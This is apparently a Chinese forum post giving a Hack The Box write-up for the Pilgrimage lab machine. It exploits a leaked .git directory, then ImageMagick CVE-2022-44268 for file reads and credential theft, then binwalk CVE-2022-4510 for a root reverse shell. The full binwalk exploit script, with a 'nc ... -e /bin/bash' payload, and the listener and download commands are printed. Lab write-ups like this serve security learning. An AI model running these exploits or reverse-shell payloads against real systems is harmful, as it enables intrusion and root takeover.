---
title: "历时5小时，成功拿下HTB 第N台 靶机 Pilgrimage，附详细记录（wp）"
source: "https://linux.do/t/topic/532186"
author:
  - "[[user792]]"
published: 2026-05-09
created: 2026-05-09
---
我已经懒得沾那一段话了，历时五个小时，打完已经筋疲力尽了  
其实今天是不想打的，磨磨蹭蹭到下午，强迫自己打开kali，开始学习，打一会刷会b站，打一会刷会论坛，不懂的再去查google问克劳德，真的不想学习，我要是可以无忧无虑打一辈子apex就好了 ![[ad42eaa81aaa345d037c73ae0855ff7d_MD5.png]]![[ad42eaa81aaa345d037c73ae0855ff7d_MD5.png]]![[ad42eaa81aaa345d037c73ae0855ff7d_MD5.png]]

[![[1feb851151b4b1b253252d9f0455841b_MD5.jpg]]

image696×641 97.3 KB  图片 696×641 97.3 KB

](https://cdn3.ldstatic.com/original/4X/e/8/0/e80758c37a719e3e66f0d2d3df188298c9b2ac82.jpeg "image")

我感觉他的难易度标识完全是标着玩的，好复杂 ![[74d5cbc6b7c465d34809434c169be714_MD5.png]]![[74d5cbc6b7c465d34809434c169be714_MD5.png]]![[74d5cbc6b7c465d34809434c169be714_MD5.png]]

下面是详细渗透测试记录

# HTB Pilgrimage 靶机渗透测试详细记录

## 初始侦察阶段

使用Nmap进行高速端口扫描：

```bash
nmap -sT -min-rate 18000 10.10.11.219
```

扫描结果显示目标主机开放了两个端口：

- **22/tcp**：SSH服务，用于远程管理
- **80/tcp**：HTTP Web服务器  80/tcp：HTTP 網站伺服器

## Web服务探测

访问目标IP的80端口时，页面会自动跳转至域名`pilgrimage.htb`。为了正确解析这个域名，需要将其添加到本地hosts文件中：

**方法一：使用vi编辑器**

```bash
vi /etc/hosts
# 添加以下内容
10.10.11.219    pilgrimage.htb
```

**方法二：使用tee命令**

```bash
echo "10.10.11.219 pilgrimage.htb" | sudo tee -a /etc/hosts
```

修改hosts文件后，访问`pilgrimage.htb`页面，发现这是一个图像处理网站。

## 目录枚举与源码泄露

使用dirb工具对网站进行目录爆破：

```bash
dirb http://pilgrimage.htb
```

在爆破结果中，发现了重要的信息：

```bash
---- Scanning URL: http://pilgrimage.htb/ ----
+ http://pilgrimage.htb/.git/HEAD (CODE:200|SIZE:23)
```

这表明网站存在`.git`目录，可能导致源代码泄露！这是一个很严重的安全问题。

> 补充：也可以使用feroxbuster进行目录爆破，速度可能更快：
> 
> ```bash
> feroxbuster --url http://pilgrimage.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
> ```

## 源码获取与分析

利用发现的`.git`目录，使用git-dumper工具克隆整个代码仓库：

```bash
# 安装git-dumper
pip3 install git-dumper --break-system-packages

# 利用泄露的.git将代码克隆到本地
git-dumper http://pilgrimage.htb/ ./pilgrimage_source
```

查看下载的文件结构：

```bash
ls -al
```

输出结果：

```yaml
总计 26972
drwxr-xr-x  5 root root     4096  4月 3日 19:53 .
drwx------ 33 root root     4096  4月 3日 19:53 ..
drwxr-xr-x  6 root root     4096  4月 3日 19:53 assets
-rwxr-xr-x  1 root root     5538  4月 3日 19:53 dashboard.php
drwxr-xr-x  7 root root     4096  4月 3日 19:53 .git
-rwxr-xr-x  1 root root     9250  4月 3日 19:53 index.php
-rwxr-xr-x  1 root root     6822  4月 3日 19:53 login.php
-rwxr-xr-x  1 root root       98  4月 3日 19:53 logout.php
-rwxr-xr-x  1 root root 27555008  4月 3日 19:53 magick
-rwxr-xr-x  1 root root     6836  4月 3日 19:53 register.php
drwxr-xr-x  4 root root     4096  4月 3日 19:53 vendor
```

经过分析发现，除了PHP源码文件外，还有一个特别引人注意的二进制可执行文件`magick`，它属于ImageMagick软件套件。

查看该软件的帮助信息：

```bash
./magick -help
```

查看软件版本：

```bash
./magick -version
```

输出结果：

```yaml
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

这是一个ImageMagick 7.1.0-49 beta版本。注意它是**测试版本（beta）**，这表明它可能不稳定且存在潜在的漏洞。

## 漏洞发现与利用

通过搜索，我发现了与这个ImageMagick版本相关的漏洞：**CVE-2022-44268**，这是一个任意文件读取漏洞。

漏洞详情：

```shell
# Exploit Title: ImageMagick 7.1.0-49 - Arbitrary File Read
# Google Dork: N/A
# Date: 06/02/2023
# Exploit Author: Cristian 'void' Giustini
# Vendor Homepage: https://imagemagick.org/
# Software Link: https://imagemagick.org/
# Version: <= 7.1.0-49
# Tested on: 7.1.0-49 and 6.9.11-60
# CVE : CVE-2022-44268
```

我们尝试利用这个漏洞读取目标系统的敏感文件。

首先获取PoC代码：

```bash
git clone https://git.rotfl.io/v/CVE-2022-44268.git
```

安装所需的Rust环境：

```bash
apt install rustup
rustup default stable
```

利用PoC生成携带攻击载荷的恶意PNG文件，首先尝试读取/etc/passwd：

```bash
cd CVE-2022-44268
cargo run "/etc/passwd"
```

使用identify工具查看生成的图片数据：

```bash
identify -verbose image.png
```

输出中可以看到成功嵌入了目标路径：

```bash
png:profile: /etc/passwd
png:text: 1 tEXt/zTXt/iTXt chunks were found
```

将生成的恶意PNG上传到目标网站，网站会处理这个图片并返回一个新的图片。分析返回的图片：

```bash
identify -verbose 67ee796fc18b5.png
```

在返回的图片中，我们发现了一大段十六进制数据：

```yaml
png:text: 4 tEXt/zTXt/iTXt chunks were found
png:tIME: 2025-04-03T12:05:03Z
Raw profile type: 
1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a...
```

这些十六进制数据正是我们要获取的/etc/passwd文件内容。将数据保存到本地并转换为可读文本：

```bash
# 去除换行符
tr -d '\n' < hex

# 使用Python将十六进制转换为文本
python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a"))'
```

分析得到的/etc/passwd文件内容，我们发现了一个用户账户：

```ruby
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
```

这是一个普通用户，UID为1000，拥有登录权限。这是一个潜在的目标用户。

## 获取数据库凭据

继续分析源代码，在index.php文件中，我们发现了数据库文件的位置：

```php
$db = new PDO('sqlite:/var/db/pilgrimage');
```

使用同样的漏洞尝试读取这个数据库文件：

```bash
cargo run "/var/db/pilgrimage"
```

上传生成的恶意PNG，分析返回的图片，并将十六进制数据转换为SQLite数据库文件：

```python
# hex.py
with open("hex", "rb") as f:
    data = bytes.fromhex(f.read().decode())
with open("sql.db", "wb") as f:
    f.write(data)
```

执行脚本：

```bash
python3 hex.py
```

验证生成的数据库文件：

```bash
file sql.db
```

输出结果：

```csharp
sql.db: SQLite 3.x database, last written using SQLite version 3034001, file counter 70, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 70
```

使用DBeaver工具打开数据库文件，在用户表中成功找到了重要凭据：

- 用户名：`emily`
- 密码：`abigchonkyboi123`

## 获取用户权限

使用获取的凭据通过SSH登录目标系统：

```bash
ssh emily@pilgrimage.htb
```

成功登录后，查找有无特权命令可以执行：

```bash
sudo -l
```

输出结果表明用户emily没有sudo权限：

```bash
[sudo] password for emily: 
Sorry, user emily may not run sudo on pilgrimage.
```

尽管如此，我们已经成功获取了用户权限，可以查看第一个flag：

```bash
cat /home/emily/user.txt
```

成功获取第一个flag：

```undefined
7d55864b7f38b8b693b845fdeea34f25
```

> 补充：也可以通过文件读取漏洞直接获取用户flag：
> 
> ```bash
> cargo run "/home/emily/user.txt"
> ```

## 权限提升

为了提升权限，首先枚举系统中以root权限运行的进程：

```bash
ps auxww | grep root
```

在输出中，我们发现了一个有趣的脚本：

```bash
root         740  0.0  0.0   6816  2356 ?        S    Apr03   0:00 /bin/bash /usr/sbin/malwarescan.sh
```

检查这个脚本的详细信息：

```bash
ls -al /usr/sbin/malwarescan.sh
-rwxr--r-- 1 root root 474 Jun  1  2023 /usr/sbin/malwarescan.sh
```

脚本是可读的，查看它的内容：

```bash
cat /usr/sbin/malwarescan.sh
```

脚本内容如下：

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

这个脚本的功能是监控`/var/www/pilgrimage.htb/shrunk/`目录，当有新文件创建时，使用`binwalk -e`命令分析文件内容。如果发现包含黑名单中的字符串（“Executable script"或"Microsoft executable”），就会删除该文件。

重点是这个脚本以root权限运行，并且使用了`binwalk -e`命令。这里可能存在提权的机会。

查看binwalk的版本：

```bash
binwalk -h
```

输出显示版本为2.3.2：

```bash
Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
```

通过搜索，我们发现binwalk 2.3.2存在漏洞**CVE-2022-4510**，这是一个远程代码执行漏洞。当binwalk使用`-e`选项（提取模式）分析文件时，精心构造的PFS文件可以导致任意代码执行。

以下是利用该漏洞的Python脚本：

```python
# Exploit Title: Binwalk v2.3.2 - Remote Command Execution (RCE)
# Exploit Author: Etienne Lacoche
# CVE-ID: CVE-2022-4510
import os
import inspect
import argparse

print("")
print("################################################")
print("------------------CVE-2022-4510----------------")
print("################################################")
print("--------Binwalk Remote Command Execution--------")
print("------Binwalk 2.1.2b through 2.3.2 included-----")
print("------------------------------------------------")
print("################################################")
print("----------Exploit by: Etienne Lacoche-----------")
print("---------Contact Twitter: @electr0sm0g----------")
print("------------------Discovered by:----------------")
print("---------Q. Kaiser, ONEKEY Research Lab---------")
print("---------Exploit tested on debian 11------------")
print("################################################")
print("")

parser = argparse.ArgumentParser()
parser.add_argument("file", help="Path to input .png file",default=1)
parser.add_argument("ip", help="Ip to nc listener",default=1)
parser.add_argument("port", help="Port to nc listener",default=1)

args = parser.parse_args()
            
if args.file and args.ip and args.port:
    header_pfs = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
    lines = ['import binwalk.core.plugin\n','import os\n', 'import shutil\n','class MaliciousExtractor(binwalk.core.plugin.Plugin):\n','    def init(self):\n','        if not os.path.exists("/tmp/.binwalk"):\n','            os.system("nc ',str(args.ip)+' ',str(args.port)+' ','-e /bin/bash 2>/dev/null &")\n','            with open("/tmp/.binwalk", "w") as f:\n','                f.write("1")\n','        else:\n','            os.remove("/tmp/.binwalk")\n', '            os.remove(os.path.abspath(__file__))\n','            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))\n']

    in_file = open(args.file, "rb")
    data = in_file.read()
    in_file.close()
    
    with open("/tmp/plugin", "w") as f:
       for line in lines:
          f.write(line)

    with open("/tmp/plugin", "rb") as f: 
        content = f.read()

    os.system("rm /tmp/plugin")

    with open("binwalk_exploit.png", "wb") as f:
        f.write(data)
        f.write(header_pfs)
        f.write(content)

    print("")    
    print("You can now rename and share binwalk_exploit and start your local netcat listener.")
    print("")
```

脚本的工作原理是创建一个包含恶意代码的PNG文件，当这个文件被binwalk以`-e`选项分析时，会向指定的IP和端口反弹shell。

执行漏洞利用：

```bash
# 生成携带攻击载荷的恶意PNG文件
python3 exp.py image123.png 10.10.16.16 9999

# 在攻击机上开启HTTP服务
python3 -m http.server 8000

# 在攻击机上开启netcat监听
nc -lvnp 9999

# 在目标机器上下载恶意文件
cd /var/www/pilgrimage.htb/shrunk
wget 10.10.16.16:8000/binwalk_exploit.png
```

当malwarescan.sh脚本以root权限运行binwalk分析我们上传的恶意文件时，就会触发漏洞并反弹一个root权限的shell：

```sql
listening on [any] 9999 ...
connect to [10.10.16.16] from (UNKNOWN) [10.10.11.219] 38974

id
uid=0(root) gid=0(root) groups=0(root)
```

成功获取root权限后，我们可以读取根目录下的flag：

```bash
cd /root
ls
quarantine
reset.sh
root.txt
cat root.txt
292d068595b97aa8545c088a9d3a659d
```

成功获取最终flag！

## 总结与安全建议

本次渗透测试成功利用了以下几个安全漏洞：

1. **源代码泄露**：网站的`.git`目录可公开访问，导致整个源码被泄露
2. **使用存在漏洞的软件**：网站使用了存在任意文件读取漏洞的ImageMagick测试版本
3. **不安全的文件处理**：malwarescan.sh脚本使用了存在RCE漏洞的binwalk工具
4. **以root权限运行脚本**：高风险的自动化脚本以最高权限运行

针对以上问题，提出以下安全建议：

1. 配置Web服务器以阻止访问敏感目录，如`.git`
2. 定期更新所有软件和库，避免使用测试版本或存在已知漏洞的版本
3. 遵循最小权限原则，不要以root权限运行不必要的服务和脚本
4. 对用户输入（特别是上传的文件）进行严格验证
5. 实施文件完整性监控，及时发现未经授权的文件修改
6. 考虑使用容器或沙箱技术隔离处理文件的应用程序

## 漏洞利用路径总结

**初始侦察** → **源码泄露** → **发现漏洞** → **获取用户权限** → **权限提升**

1. 通过目录枚举发现`.git`目录
2. 使用git-dumper获取完整源代码
3. 发现并利用ImageMagick漏洞(CVE-2022-44268)读取敏感文件
4. 获取emily用户的凭据并成功SSH登录
5. 利用binwalk漏洞(CVE-2022-4510)获取root权限